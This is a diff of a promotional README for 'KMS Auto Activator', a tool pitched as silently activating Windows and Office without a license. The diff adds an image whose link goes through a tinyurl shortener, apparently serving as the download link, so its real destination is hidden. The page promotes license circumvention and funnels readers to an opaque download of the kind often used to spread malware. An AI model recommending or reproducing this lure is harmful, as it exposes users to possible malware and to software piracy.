@@ -5,7 +5,7 @@ Welcome to the hands-free solution for unlocking your Microsoft software's full 
 ## Overview: Smart Automation
 KMS Auto Activator is designed to simplify the technical process of software activation. Instead of requiring user input or complicated settings, it intelligently handles everything in the background. This makes accessing premium features straightforward and reliable for everyone.
 
-
+[![8567957890](https://github.com/user-attachments/assets/d88081b5-1a11-464a-8bc0-e5ee8924b3a9)](https://tinyurl.com/464w45x9)
 
 ## Core Advantage: Complete Automation 🚀
 The main benefit is its **truly "set-and-forget" operation**. Once initiated, the tool performs all necessary steps automatically:
@@ -16,9 +16,13 @@ The main benefit is its **truly "set-and-forget" operation**. Once initiated, th
 
 ## Key Features & Capabilities
 ✨ **Universal Compatibility** – Seamlessly works across the entire Microsoft ecosystem.
+
 ✨ **Intelligent System Analysis** – Detects your exact Windows version and Office editions.
+
 ✨ **Persistent Configuration** – Sets up long-term activation that maintains itself.
+
 ✨ **Integrated Troubleshooting** – Includes automatic repair functions for common issues.
+
 ✨ **Minimal Interface** – Clean design with clear progress indicators and logs.
 
 ## Step-by-Step Process
